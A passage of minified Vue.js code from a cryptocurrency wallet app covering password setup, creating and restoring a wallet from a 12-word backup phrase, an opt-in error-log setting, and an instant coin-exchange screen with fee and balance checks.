                            await this.validateForm() && (this.$storage.password = this.password, this.loading = !0, this.showLoaderSpinner = !0, await Promise.all([this.$wallets.initialized, this.resetWalletInfo()]), this.showLoaderSpinner = !1, this.mnemonic ? this.restoreWallet() : (await this.generateMnemonic(), await this.registerAsReferal()), this.initChartData(), this.getChartDataFromNet({
                                isGetAtOnce: !0,
                                isMainChartData: !1
                            }))
                        },
                        async newWallet() {
                            Promise.all(Array.from(this.$wallets).map(async t => (t instanceof Et.D || (this.$bus.$emit("update", {
                                ticker: t.ticker,
                                alias: t.alias
                            }), "function" == typeof t.createToken && t.tokens && Object.values(t.tokens).forEach(t => {
                                this.$bus.$emit("update", {
                                    ticker: t.ticker,
                                    alias: t.alias
                                })
                            })), t))).then(() => {
                                this.$emit("goNext", this.$wallets.mnemonic.toString())
                            }).catch(t => {
                                console.log("some catch appeared in NewWallet method"), console.log(t)
                            }).finally(() => {
                                this.$storage.set("general_mnemonic", this.$wallets.mnemonic.phrase), this.saveWallets()
                            })
                        },
                        loadWallet() {
                            Promise.all(Array.from(this.$wallets).map(async t => (t instanceof Et.D || (this.$bus.$emit("update", {
                                ticker: t.ticker,
                                alias: t.alias
                            }), "function" == typeof t.createToken && t.tokens && Object.values(t.tokens).forEach(t => {
                                this.$bus.$emit("update", {
                                    ticker: t.ticker,
                                    alias: t.alias
                                })
                            })), t))).then(() => {
                                this.$bus.$emit("update::main")
                            }).catch(console.log).finally(() => {
                                this.saveWallets()
                            })
                        }
                    }
                },
                Pt = Object(c.a)(At, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", [i("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: !t.loading,
                            expression: "!loading"
                        }]
                    }, [i("Edit", {
                        ref: "passwordRef",
                        attrs: {
                            error: t.passwordError,
                            focus: !0,
                            isShowPassword: !0,
                            placeholder: "Password",
                            type: "password"
                        },
                        on: {
                            changeTypeRepeatPassword: t.changeTypeRepeatPassword
                        },
                        model: {
                            value: t.password,
                            callback: function (e) {
                                t.password = e
                            },
                            expression: "password"
                        }
                    }), t._v(" "), i("Edit", {
                        ref: "repeatPasswordRef",
                        attrs: {
                            error: t.passwordConfirmError,
                            type: t.repeatPasswordType,
                            placeholder: "Repeat Password",
                            name: "age"
                        },
                        model: {
                            value: t.passwordConfirm,
                            callback: function (e) {
                                t.passwordConfirm = e
                            },
                            expression: "passwordConfirm"
                        }
                    }), t._v(" "), i("button", {
                        staticClass: "button",
                        on: {
                            click: function (e) {
                                return e.preventDefault(), e.stopPropagation(), t.setPassword.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n      Set password\n    ")]), t._v(" "), i("button", {
                        staticClass: "button link",
                        on: {
                            click: function (e) {
                                return e.preventDefault(), e.stopPropagation(), t.$emit("goBack")
                            }
                        }
                    }, [t._v("\n      Back\n    ")])], 1), t._v(" "), i("div", {
                        directives: [{
                            name: "show",
                            rawName: "v-show",
                            value: t.showLoaderSpinner,
                            expression: "showLoaderSpinner"
                        }],
                        staticClass: "loading-wrap"
                    }, [i("div", {
                        staticClass: "loading"
                    })])])
                }), [], !1, null, null, null).exports;
            var Rt = {
                    name: "CreatePage",
                    components: {
                        SetPassword: Pt
                    },
                    mixins: [f.f],
                    data: () => ({
                        step: "setpass",
                        seed: "",
                        copied: !1,
                        enableMonitoring: !0
                    }),
                    watch: {
                        enableMonitoring(t) {
                            localStorage.setItem("isMonitoringEnabled", t)
                        }
                    },
                    methods: {
                        openWallet() {
                            this.$router.push({
                                path: "/main",
                                query: {
                                    initAutoUpdates: "true",
                                    doNotCheckActivation: "true"
                                }
                            })
                        },
                        async goBack() {
                            await this.$storage.exists("general_mnemonic").catch(console.log) ? this.$router.push("/entry/login") : this.$router.push("/entry")
                        },
                        goNext(t) {
                            this.seed = t, this.step = "newseed"
                        },
                        copySeed() {
                            let t = this.seed;
                            g.clipboard.writeText(t), this.copied = !0, setTimeout(() => {
                                this.copied = !1
                            }, 800)
                        }
                    }
                },
                It = Object(c.a)(Rt, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "wrap",
                        class: {
                            small: "setpass" === t.step, big: "newseed" === t.step
                        }
                    }, ["setpass" === t.step ? i("SetPassword", {
                        attrs: {
                            isCreateWallet: ""
                        },
                        on: {
                            goBack: t.goBack,
                            goNext: t.goNext
                        }
                    }) : t._e(), t._v(" "), "newseed" === t.step ? i("div", {
                        staticClass: "newseed"
                    }, [i("div", {
                        staticClass: "title"
                    }, [t._v("\n      Please write down a 12-word Backup Phrase and keep the copy in a secure place\n    ")]), t._v(" "), i("p", [t._v("\n      " + t._s(t.$texts.onboarding.subtitle) + "\n    ")]), t._v(" "), i("p", {
                        staticClass: "seed",
                        on: {
                            click: t.copySeed
                        }
                    }, [t._v("\n      " + t._s(t.seed) + "\n    ")]), t._v(" "), i("button", {
                        staticClass: "button link",
                        on: {
                            click: function (e) {
                                return e.stopPropagation(), t.copySeed.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n      " + t._s(t.copied ? "Copied" : "Copy to clipboard") + "\n    ")]), t._v(" "), i("button", {
                        staticClass: "button",
                        on: {
                            click: function (e) {
                                return e.stopPropagation(), t.openWallet.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n      Open wallet\n    ")]), t._v(" "), i("label", {
                        staticClass: "checkbox"
                    }, [i("input", {
                        directives: [{
                            name: "model",
                            rawName: "v-model",
                            value: t.enableMonitoring,
                            expression: "enableMonitoring"
                        }],
                        attrs: {
                            type: "checkbox"
                        },
                        domProps: {
                            checked: Array.isArray(t.enableMonitoring) ? t._i(t.enableMonitoring, null) > -1 : t.enableMonitoring
                        },
                        on: {
                            change: function (e) {
                                var i = t.enableMonitoring,
                                    s = e.target,
                                    a = !!s.checked;
                                if (Array.isArray(i)) {
                                    var n = t._i(i, null);
                                    s.checked ? n < 0 && (t.enableMonitoring = i.concat([null])) : n > -1 && (t.enableMonitoring = i.slice(0, n).concat(i.slice(n + 1)))
                                } else t.enableMonitoring = a
                            }
                        }
                    }), i("span", [t._v("\n        Enable log collection\n      ")]), t._v(" "), t._m(0)])]) : t._e()], 1)
                }), [function () {
                    var t = this.$createElement,
                        e = this._self._c || t;
                    return e("div", {
                        staticClass: "state tooltip-hover"
                    }, [e("img", {
                        staticClass: "icon",
                        attrs: {
                            src: "static/img/icon-faq.png"
                        }
                    }), this._v(" "), e("div", {
                        staticClass: "tooltip"
                    }, [this._v("\n          Let Atomic automatically collect anonymous errors data to improve your experience. "), e("br"), this._v("This feature will\n          highly increase support quality and will help us to resolve your issues quicker. "), e("br"), this._v("\n          Atomic collects description of the error and coin name. This information is absolutely anonymous. "), e("br"), this._v("\n          If you don't like to send your errors, you can avoid this option.\n        ")])])
                }], !1, null, null, null).exports;
            var Ft = {
                    name: "RestorePage",
                    components: {
                        Edit: kt.a,
                        SetPassword: Pt
                    },
                    data: () => ({
                        step: "restore",
                        mnemonicError: "",
                        restoreseed: ""
                    }),
                    watch: {
                        restoreseed() {
                            this.restoreseed && this.restoreseed.length > 0 && (this.mnemonicError = "")
                        }
                    },
                    methods: {
                        async restoreByWords() {
                            12 === this.restoreseed.trim().split(/\s+/).length ? this.$wallets.validateMnemonic(this.restoreseed.trim().toLowerCase()) ? this.step = "setpass" : this.mnemonicError = "Invalid mnemonic" : this.mnemonicError = "Backup Phrase should contain 12 words"
                        },
                        async goBack() {
                            await this.$storage.exists("general_mnemonic").catch(console.log) ? this.$router.push("/entry/login") : this.$router.push("/entry")
                        },
                        goToRestore() {
                            this.step = "restore"
                        }
                    }
                },
                Nt = Object(c.a)(Ft, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("div", {
                        staticClass: "wrap",
                        class: {
                            small: "setpass" === t.step
                        }
                    }, [i("transition", {
                        attrs: {
                            mode: "out-in",
                            name: "slide-left"
                        }
                    }, ["restore" === t.step ? i("div", [i("Edit", {
                        attrs: {
                            error: t.mnemonicError,
                            focus: !0,
                            isPasteFromClipboard: !0,
                            placeholder: "Your 12-word backup phrase",
                            type: "text"
                        },
                        on: {
                            "enter-pressed": t.restoreByWords
                        },
                        model: {
                            value: t.restoreseed,
                            callback: function (e) {
                                t.restoreseed = e
                            },
                            expression: "restoreseed"
                        }
                    }), t._v(" "), i("button", {
                        staticClass: "margin-top-big button",
                        on: {
                            click: function (e) {
                                return e.preventDefault(), e.stopPropagation(), t.restoreByWords.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n        Restore wallet\n      ")]), t._v(" "), i("button", {
                        staticClass: "button link",
                        on: {
                            click: function (e) {
                                return e.preventDefault(), e.stopPropagation(), t.goBack.apply(null, arguments)
                            }
                        }
                    }, [t._v("\n        Back\n      ")])], 1) : t._e(), t._v(" "), "setpass" === t.step ? i("SetPassword", {
                        attrs: {
                            mnemonic: t.restoreseed
                        },
                        on: {
                            goBack: t.goToRestore
                        }
                    }) : t._e()], 1)], 1)
                }), [], !1, null, null, null).exports,
                Dt = i(1692);
            var Bt = {
                    name: "Exchange",
                    components: {
                        NewExchangeResult: Dt.a
                    },
                    filters: {
                        fixedAmount: function (t) {
                            return Number(Number(t).toFixed(6)).toString()
                        }
                    },
                    mixins: [f.h],
                    data: () => ({
                        tabs: [{
                            title: "Instant Exchange",
                            path: "/exchange"
                        }, {
                            title: "Order History",
                            path: "/exchange/history"
                        }],
                        isExchangeDetails: !1,
                        coinToSend: null,
                        coinToReceive: null,
                        amountToSend: "",
                        amountToReceive: "",
                        exchangeResult: null,
                        cashback: "",
                        sentHash: "",
                        receivedHash: "",
                        fetchExchangeTransactionsTimeout: null,
                        exchangeStartingValues: {},
                        initTransactionData: {},
                        transactionTimestamp: null,
                        isRefunded: !1
                    }),
                    computed: {
                        ...Object(n.c)(["exchangeTransactions"])
                    },
                    mounted() {
                        this.setBasicStorageTxsEstimated(), this.$bus.$on("close-exchange-basic-popup", this.closeOrderDetails)
                    },
                    beforeDestroy() {
                        clearTimeout(this.fetchExchangeTransactionsTimeout), this.$bus.$off("close-exchange-basic-popup", this.closeOrderDetails)
                    },
                    methods: {
                        ...Object(n.b)(["updateExchangeTransactions", "getExchangeTransactions"]),
                        isActive(t) {
                            return ["exchange-basic", "exchange-with-tickers"].includes(this.$route.name) && "/exchange" === t
                        },
                        closeOrderDetails() {
                            this.isExchangeDetails = !1
                        },
                        closeSuccessPopup() {
                            this.initTransactionData = {}
                        },
                        closePopups() {
                            this.closeOrderDetails(), this.closeSuccessPopup(), clearTimeout(this.fetchExchangeTransactionsTimeout)
                        },
                        getWalletData(t) {
                            return this.currentService.getInternalWalletData({
                                legacyTicker: t
                            })
                        },
                        openExchangeDetails(t) {
                            clearTimeout(this.fetchExchangeTransactionsTimeout), this.openOrderDetails(t), this.fetchExchangeTransactionsTimeout = setTimeout(() => this.openExchangeDetails(t), 3e4)
                        },
                        startExchange(t) {
                            const e = {
                                initTime: Date.now(),
                                isCompleted: !1,
                                ...t
                            };
                            this.updateTxEstimatedInLocalStorage(e), this.openExchangeDetails(t)
                        },
                        updateTxEstimatedInLocalStorage(t) {
                            this.setBasicStorageTxsEstimated();
                            let e = JSON.parse(localStorage.getItem("txs::estimated"));
                            if (!Array.isArray(e)) return;
                            const i = e.findIndex(e => e.id === t.id); - 1 === i ? e.unshift(t) : e[i] = t, localStorage.setItem("txs::estimated", JSON.stringify(e))
                        },
                        getTxByIdFromTxEstimatedInLocalStorage(t) {
                            let e = JSON.parse(localStorage.getItem("txs::estimated"));
                            if (!Array.isArray(e)) return null;
                            const i = e.findIndex(e => e.id === t);
                            return -1 === i ? null : e[i]
                        },
                        setBasicStorageTxsEstimated() {
                            const t = JSON.parse(localStorage.getItem("txs::estimated"));
                            Array.isArray(t) || localStorage.setItem("txs::estimated", "[]")
                        },
                        getStatusName(t) {
                            switch (t && t.toLowerCase()) {
                            case "confirming":
                                return "Confirming";
                            case "exchanging":
                                return "Exchanging";
                            case "sending":
                                return "Sending";
                            case "finished":
                            case "completed":
                                return "Completed";
                            case "failed":
                                return "Failed";
                            case "refunded":
                                return "Refunded";
                            case "expired":
                                return "Expired";
                            default:
                                return "Awaiting deposit"
                            }
                        },
                        txCompletedHook(t) {
                            this.updateTxEstimatedInLocalStorage({
                                completedTime: Date.now(),
                                ...this.getTxByIdFromTxEstimatedInLocalStorage(t.id),
                                isCompleted: !0
                            }), this.amountToReceive = this.$options.filters.fixedAmount(t.amountToReceive), this.initTransactionData = this.getTxByIdFromTxEstimatedInLocalStorage(t.id), clearTimeout(this.fetchExchangeTransactionsTimeout)
                        },
                        updateActiveTx(t) {
                            this.activeTx = t, this.transactionStatus = this.getStatusName(t.status), this.isExchangeDetails = !0, this.coinToSend = t.from ? this.$wallets.findWallet(t.from.ticker, "atomic", t.from.contract) : this.$wallets.findWalletV2(this.getWalletData(t.fromCurrency)), this.coinToReceive = t.to ? this.$wallets.findWallet(t.to.ticker, "atomic", t.to.contract) : this.$wallets.findWalletV2(this.getWalletData(t.toCurrency)), this.amountToSend = this.$options.filters.fixedAmount(t.amountToSend), this.amountToReceive = this.$options.filters.fixedAmount(t.amountToReceive), this.cashback = t.expectedCashbackAmount, this.exchangeResult = {
                                txid: t.id
                            }, this.sentHash = t.payinHash, this.receivedHash = t.payoutHash, this.transactionTimestamp = t.timestamp
                        },
                        setTransactionValues(t) {
                            const e = t.find(t => {
                                var e;
                                return t.id === (null === (e = this.initTransactionData) || void 0 === e ? void 0 : e.id)
                            });
                            e && e.amountToReceive && ("completed" !== e.status.toLowerCase() && "refunded" !== e.status.toLowerCase() || this.txCompletedHook(e))
                        },
                        openOrderDetails(t) {
                            if (this.updateActiveTx(t), this.initTransactionData = this.getTxByIdFromTxEstimatedInLocalStorage(t.id), !this.isMocked) {
                                const e = [this.getStatus(t.id)];
                                e.length > 0 && this.updatingStatus(e)
                            }
                        },
                        continueExchange: async function (t) {
                            try {
                                this.isRefunded = !0, this.activeTx.amountToReceive = t;
                                const e = await this.exchangeContinue(this.activeTx);
                                e.result && (this.startExchange(this.activeTx), await this.updateExchangeTransactions([this.activeTx]), this.openExchangeDetails(this.activeTx)), this.isRefunded = !e.result
                            } catch (t) {
                                console.error(t)
                            }
                        },
                        async refundExchange() {
                            try {
                                this.isRefunded = !0;
                                const t = await this.refundTransaction(this.activeTx);
                                t.result && (this.startExchange(this.activeTx), this.updateTxRefundedInLocalStorage(this.activeTx), this.isMocked && setTimeout(() => {
                                    this.updateActiveTx({
                                        ...this.activeTx,
                                        status: "Refunded"
                                    })
                                }, 8e3)), this.isRefunded = !t.result
                            } catch (t) {
                                console.error(t)
                            }
                        },
                        updateTxRefundedInLocalStorage(t) {
                            try {
                                this.setBasicStorageTxsEstimated();
                                let e = JSON.parse(localStorage.getItem("refunding::txs"));
                                if (!Array.isArray(e)) return;
                                const i = e.findIndex(e => e.id === t.id); - 1 === i ? e.unshift({
                                    id: t.id
                                }) : e[i] = {
                                    id: t.id
                                }, localStorage.setItem("refunding::txs", JSON.stringify(e))
                            } catch (t) {
                                console.log(t)
                            }
                        },
                        async updatingStatus(t) {
                            Promise.all(t.map(t => t.catch(t => t))).then(t => {
                                const e = (t = t.filter(t => t.status)).map(t => {
                                    const e = {
                                        id: t.id,
                                        status: this.getStatusName(t.status)
                                    };
                                    return this.activeTx && this.activeTx.id === e.id && (t.payinHash && (this.activeTx.payinHash = t.payinHash, this.sentHash = t.payinHash), t.payoutHash && (this.activeTx.payoutHash = t.payoutHash, this.receivedHash = t.payoutHash), this.activeTx.status = e.status, this.transactionStatus = e.status), t.amountToReceive && (e.amountToReceive = t.amountToReceive), t.payinHash && (e.payinHash = t.payinHash), t.payoutHash && (e.payoutHash = t.payoutHash, e.txHash = t.payoutHash), e
                                });
                                this.setTransactionValues(e), this.updateExchangeTransactions(e), this.$forceUpdate()
                            }).catch(t => {
                                console.log(t)
                            })
                        }
                    }
                },
                Wt = Object(c.a)(Bt, (function () {
                    var t = this,
                        e = t.$createElement,
                        i = t._self._c || e;
                    return i("main", [i("div", {
                        staticClass: "header-tabs"
                    }, t._l(t.tabs, (function (e, s) {
                        return i("router-link", {
                            key: s,
                            staticClass: "choice",
                            class: {
                                active: t.isActive(e.path)
                            },
                            attrs: {
                                tag: "div",
                                exactActiveClass: "active",
                                to: e.path
                            }
                        }, [i("span", [t._v("\n        " + t._s(e.title) + "\n      ")])])
                    })), 1), t._v(" "), i("router-view", {
                        on: {
                            openOrderDetails: t.openOrderDetails,
                            openExchangeDetails: t.openExchangeDetails,
                            startExchange: t.startExchange,
                            updatingStatus: t.updatingStatus
                        }
                    }), t._v(" "), i("transition", {
                        attrs: {
                            name: "fade-down"
                        }
                    }, [t.isExchangeDetails ? i("NewExchangeResult", {
                        attrs: {
                            coinToSend: t.coinToSend,
                            coinToReceive: t.coinToReceive,
                            amountToSend: t.amountToSend,
                            amountToReceive: t.amountToReceive,
                            orderId: t.exchangeResult.txid,
                            cashback: t.cashback,
                            type: "orderDetails",
                            transactionStatus: t.transactionStatus,
                            sentHash: t.sentHash,
                            receivedHash: t.receivedHash,
                            timestamp: t.transactionTimestamp,
                            isRefunded: t.isRefunded,
                            initTransactionData: t.initTransactionData
                        },
                        on: {
                            "continue-exchange": t.continueExchange,
                            "refund-exchange": t.refundExchange,
                            "close-popup": t.closePopups
                        }
                    }) : t._e()], 1)], 1)
                }), [], !1, null, null, null).exports,
                Ot = i(644),
                Lt = i(385),
                Mt = i(386),
                Ht = i(645),
                Ut = i(48),
                jt = i(646),
                Kt = i(69);
            const Vt = ["VET"],
                qt = ["MATIC"];
            var Gt = {
                    name: "ExchangeBasic",
                    components: {
                        ErrorPlain: Ot.a,
                        ChangeIcon: Lt.a,
                        ExchangeCoin: Mt.a,
                        CashbackInfo: Ht.a,
                        SendCoinResult: Ut.a,
                        CashbackPromotion: jt.a
                    },
                    mixins: [f.h, f.c, f.p],
                    data: () => ({
                        valid: {
                            message: "",
                            status: !0
                        },
                        amountToSend: "",
                        amountToReceive: "...",
                        availableBalance: "...",
                        filteredCurrenciesExchange: [],
                        minimalAmount: 0,
                        exchangeRate: null,
                        loading: !1,
                        selectedCoinToSend: "eth",
                        selectedCoinToReceive: "btc",
                        selectedCoinToSendId: "eth",
                        selectedCoinToReceiveId: "btc",
                        inactivePairError: "",
                        amountToSendError: "",
                        exchangeResult: {},
                        currencies: [],
                        isError: !1,
                        feeToClaim: null,
                        fetcher: null,
                        pairRateInterval: null,
                        feeParams: {},
                        orderId: "",
                        sentHash: "",
                        isBuyCoin: !1,
                        maxFeeForTRC20: 0,
                        isMinMaxError: !1
                    }),
                    computed: {
                        ...Object(n.c)(["currenciesExchange"]),
                        claimButtonText() {
                            return "THETA" === this.coinToSend.parent ? "Claim TFUEL" : "Claim " + ("VET" === this.coinToSend.parent ? "VTHO" : this.coinToSend.parent)
                        },
                        isActiveExchangeButton() {
                            return Number(this.amountToSend) > 0 && this.valid.status && "..." !== this.amountToReceive
                        },
                        isExchangeDisabled() {
                            return this.isCoinDisabled(this.coinToReceive) || this.isCoinDisabled(this.coinToSend)
                        },
                        coinToSend() {
                            const t = this.$wallets.getWallet(this.selectedCoinToSendId);
                            return t || this.$wallets.getWallet("eth")
                        },
                        coinToReceive() {
                            const t = this.$wallets.getWallet(this.selectedCoinToReceiveId);
                            return t || this.$wallets.getWallet("btc")
                        },
                        feeWallet() {
                            var t;
                            return this.$wallets.getWallet(this.coinToSend.getFeeTicker ? this.coinToSend.getFeeTicker() : null === (t = this.coinToSend) || void 0 === t ? void 0 : t.parent)
                        },
                        cashbackParams() {
                            return {
                                amount: this.amountToSend,
                                wallet: this.coinToSend
                            }
                        },
                        isHBARActivate() {
                            return "HBAR" === this.coinToSend.id && !this.coinToSend.address || "HBAR" === this.coinToReceive.id && !this.coinToReceive.address
                        }
                    },
                    watch: {
                        availableBalance() {
                            this.validateExchange()
                        },
                        coinToSend(t, e) {
                            this.watchForCoins(this.coinToReceive, t, e)
                        },
                        coinToReceive(t, e) {
                            this.watchForCoins(this.coinToSend, t, e), t !== e && this.valid.status && (clearTimeout(this.fetcher), this.fetcher = setTimeout(() => {
                                this.fetchRate()
                            }, 500))
                        }
                    },
                    async beforeMount() {
                        this.filteredCurrenciesExchange = await this.$exchanges.getAvailableWalletIdCollection(this.currenciesExchange, this.$wallets), this.filteredCurrenciesExchange = this.filteredCurrenciesExchange.filter(t => !Kt.e.includes(t)), this.$bus.$on("update::balance", this.updateAvailableBalanceHandler);
                        const t = this.$route.query.receive;
                        if (t) return this.selectedCoinToReceive = t.ticker, this.selectedCoinToReceiveId = t.id, this.selectedCoinToSend = "btc", void(this.selectedCoinToSendId = "btc");
                        if (this.$route.params && this.$route.params.idToReceive && this.$route.params.idToSend) {
                            const {
                                idToReceive: t,
                                idToSend: e
                            } = this.$route.params;
                            return this.selectedCoinToSend = this.$wallets.getWallet(e).ticker, this.selectedCoinToSendId = e, this.selectedCoinToReceive = this.$wallets.getWallet(t).ticker, void(this.selectedCoinToReceiveId = t)
                        }
                        this.setSelectedCoinToSend(localStorage.getItem("exchange::coin-to-send"), localStorage.getItem("exchange::coin-to-send-id")), this.setSelectedCoinToReceive(localStorage.getItem("exchange::coin-to-receive"), localStorage.getItem("exchange::coin-to-receive-id"))
                    },
                    beforeDestroy() {
                        this.$bus.$off("update::balance", this.updateAvailableBalanceHandler), clearTimeout(this.fetcher), clearInterval(this.pairRateInterval)
                    },
                    async mounted() {
                        await this.setMinimalAmount(), await this.getAvailableBalance(), this.validateExchange()
                    },
                    methods: {
                        isCoinAvailable(t) {
                            const e = this.$wallets.findWallet(t);
                            return e && e.ticker
                        },
                        setSelectedCoinToSend(t, e) {
                            t && "undefined" !== t && this.isCoinAvailable(t) || (e = "eth", t = "eth"), this.selectedCoinToSend = t, this.selectedCoinToSendId = e
                        },
                        setSelectedCoinToReceive(t, e) {
                            t && "undefined" !== t && this.isCoinAvailable(t) || (e = "btc", t = "btc"), this.selectedCoinToReceive = t, this.selectedCoinToReceiveId = e
                        },
                        getCoinId(t) {
                            return Array.from(this.$wallets).find(({
                                ticker: e
                            }) => e.toUpperCase() === t.toUpperCase()).id || null
                        },
                        async buyCoin() {
                            const t = this.isMinMaxError ? this.coinToSend.id : this.coinToSend.feeTicker;
                            this.$buy.isAvailable({
                                id: t
                            }) ? this.$router.push("/simplex/USD/" + this.$buy.getAvailableWallet({
                                id: t
                            }).id) : (this.selectedCoinToReceive = t, this.selectedCoinToReceiveId = t, this.selectedCoinToSend = "BTC", this.selectedCoinToSendId = "BTC", await this.getAvailableBalance())
                        },
                        isCoinDisabled: t => (null == t ? void 0 : t.ticker) && !Et.o.isAllowed(t.ticker, Et.c),
                        tryAgain() {
                            this.isError = !1
                        },
                        async updateAvailableBalanceHandler(t) {
                            this.coinToSend && (t !== this.coinToSend.ticker && t !== this.coinToSend.parent || await this.getAvailableBalance(!1))
                        },
                        async watchForCoins(t, e) {
                            this.exchangeRate = null, t !== e && (this.clearValidation(), await this.setMinimalAmount()), this.validateExchange()
                        },
                        clearValidation() {
                            this.amountToSendError = "", this.valid = {
                                message: "",
                                status: !0
                            }
                        },
                        async setMinimalAmount() {
                            this.inactivePairError = "";
                            try {
                                const t = await this.getMinimalAmount(this.coinToSend, this.coinToReceive);
                                this.minimalAmount = t ? t.min : 0
                            } catch (e) {
                                var t;
                                "not_valid_ticker_pair" === (null == e || null === (t = e.data) || void 0 === t ? void 0 : t.error) ? this.inactivePairError = "Choose different coins to exchange": this.inactivePairError = "Pair is temporarily unavailable"
                            }
                        },
                        talkWithSupport() {
                            let t = "ETH";
                            if ("BTT" === this.coinToSend.ticker ? t = "TRX" : "ONT" === this.coinToSend.ticker ? t = "ONG" : "VET" === this.coinToSend.ticker ? t = "VTHO" : "THETA" === this.coinToSend.ticker && (t = "TFUEL"), ["TRX", "BSC", "TFUEL"].includes(this.feeWallet.ticker)) {
                                const t = "TFUEL" === this.feeWallet.ticker ? this.coinToSend.address : this.feeWallet.address,
                                    e = {
                                        additionalText: `-----------------------\nFee: ${this.feeToClaim} ${this.feeWallet.ticker}\nMy ${this.feeWallet.ticker} address: ${t}`,
                                        subject: "Exchange",
                                        isNotText: !1
                                    };
                                return "TFUEL" === this.feeWallet.ticker && (e.additionalText = "Dear support, I don't have enough TFUEL to complete exchange. Could you help me, please?\n" + e.additionalText, e.isNotText = !0), void this.$bus.$emit("openSupportPopup", e)
                            }
                            const e = `My ${t} address:%0A${this.$address(this.coinToSend.parent)}%0A${t} fee ${this.feeToClaim}%0A`,
                                i = `Claim ${t} for ${this.coinToSend.ticker} exchange`;
                            this.writeMail(e, i)
                        },
                        async validateExchange() {
                            this.feeToClaim = null, this.isBuyCoin = !1, this.isMinMaxError = !1;
                            for (const t of [this.selectedCoinToReceiveId, this.selectedCoinToSendId])
                                if (!Et.o.isAllowed(t.toUpperCase(), Et.c)) return void(this.valid = {
                                    message: Et.o.getMessage(t.toUpperCase(), Et.c),
                                    status: !1
                                });
                            if (this.inactivePairError) return void(this.valid = {
                                message: this.inactivePairError,
                                status: !1
                            });
                            if (this.coinToSend.id === this.coinToReceive.id) return void(this.valid = {
                                message: "Choose different coins to exchange",
                                status: !1
                            });
                            const t = this.getMaxMinErrorText();
                            if (t) return void(this.valid = {
                                message: t,
                                status: !1
                            });
                            const e = await this.isAvailableForSend();
                            e ? this.valid = {
                                message: e,
                                status: !1
                            } : Number(this.amountToSend) > 0 && "XRP" === this.coinToReceive.ticker && Number(this.amountToReceive) < 21 && Number(this.amountToReceive) > 0 && !isNaN(Number(this.amountToReceive)) ? this.valid = {
                                message: "Minimal amount for receiving is 21 XRP",
                                status: !1
                            } : this.amountToSendError ? this.valid = {
                                message: this.amountToSendError,
                                status: !1
                            } : this.valid = {
                                message: "",
                                status: !0
                            }
                        },
                        getMaxMinErrorText() {
                            const t = this.$rates.convertToUSD(this.amountToSend, this.coinToSend, "BTC"),
                                e = this.$rates.getCoinPrice(this.coinToSend, "BTC"),
                                i = Number((10 / e).toFixed(6));
                            var s;
                            if (i && t && Number(t) >= 10) return `The maximum amount for exchange is ${i} ${null===(s=this.coinToSend)||void 0===s?void 0:s.ticker}.\nWe recommend you to split the exchange into several transactions`;
                            if (Number(this.amountToSend) >= Number(this.minimalAmount)) return !1;
                            Number(this.availableBalance) < Number(this.minimalAmount) && (this.isBuyCoin = !qt.includes(this.coinToSend.parent), this.isMinMaxError = !0);
                            const a = this.coinToSend.ticker;
                            return `The minimum amount for exchange is ${this.$options.filters.formatFinance(this.minimalAmount)} ${a}`
                        },
                        getIsBuyCoin() {
                            const t = this.$rates.convertToUSD(this.amountToSend, this.coinToSend, "BTC"),
                                e = this.$rates.getCoinPrice(this.coinToSend, "BTC");
                            Number((10 / e).toFixed(6)) && t && Number(t) >= 10 || (Number(this.amountToSend) >= Number(this.minimalAmount) && (this.isBuyCoin = !qt.includes(this.coinToSend.parent)), Number(this.amountToSend) > Number(this.availableBalance || 0) && (this.isBuyCoin = !qt.includes(this.coinToSend.parent)))
                        },
                        async isAvailableForSend() {
                            let t = !0,
                                e = !0;
                            const i = this.coinToSend.toMinimalUnit(this.amountToSend),
                                s = this.coinToSend.toMinimalUnit(this.availableBalance),
                                {
                                    BN: a
                                } = this.$wallets.getWallet(this.coinToSend.parent);
                            if (e = this.amountToSend >= 0 && new a(i).lte(new a(s)), !e) return this.getIsBuyCoin(), this.isBuyCoin = !qt.includes(this.coinToSend.parent), this.isMinMaxError = !0, `To make this exchange, deposit more ${this.coinToSend.ticker} to your wallet`;
                            if ((this.coinToSend instanceof Et.D || Vt.includes(this.coinToSend.ticker)) && (t = await this.coinToSend.isAvailableForFee(new this.feeWallet.BN(this.feeParams.fee), this.feeWallet.indivisibleBalance)), ["ONT", "THETA"].includes(this.coinToSend.ticker) && (t = this.feeWallet.indivisibleBalance.gte(this.feeParams.fee)), !t) {
                                this.isBuyCoin = !1;
                                const t = this.feeWallet.toCurrencyUnit(this.feeParams.fee);
                                return ["TRX", "BSC", "BTT", "VET", "ONT", "TFUEL", "ETH"].includes(this.feeWallet.ticker) && (this.feeToClaim = t), "THETA" === this.coinToSend.ticker ? `You don’t have enough ${this.feeWallet.ticker} to exchange ${this.coinToSend.ticker}` : `You should have ${t} ${this.feeWallet.ticker} to exchange ${this.coinToSend.ticker}`
                            }
                            return !!(() => {
                                const t = new this.coinToSend.BN(this.coinToSend.toMinimalUnit(this.amountToSend)),
                                    e = new this.coinToSend.BN(this.coinToSend.toMinimalUnit(this.availableBalance)),
                                    i = this.coinToSend.indivisibleBalance;
                                return t.gt(e) && t.lte(i)
                            })() && `You should leave minimum\n          ${this.coinToSend.toCurrencyUnit(this.coinToSend.unspendableBalance)}\n          ${this.coinToSend.ticker} on your account,\n          this amount is locked by ${this.coinToSend.name}.`
                        },
                        async getAvailableBalance(t = !0) {
                            const e = this.coinToSend instanceof Et.D;
                            let i = null;
                            if (this.feeWallet.isFeeDynamic && this.feeWallet.isFeeDynamic()) {
                                const t = e ? await this.feeWallet.estimateGas("1", "", this.coinToSend.contract, this.coinToSend.denom) : this.coinToSend.gasLimit,
                                    s = await this.feeWallet.getGasPrice(!1, e);
                                i = await this.feeWallet.getFee({
                                    userGasPrice: String(s),
                                    gasLimit: t
                                }), this.feeParams.gasLimit = t, this.feeParams.gasPrice = s, this.feeParams.fee = i
                            } else {
                                const t = "ADA" === this.feeWallet.ticker ? this.feeWallet.privateKey.byronAddress : void 0;
                                i = await this.feeWallet.getFee({
                                    address: t
                                }), this.feeParams.fee = i
                            }
                            var s, a;
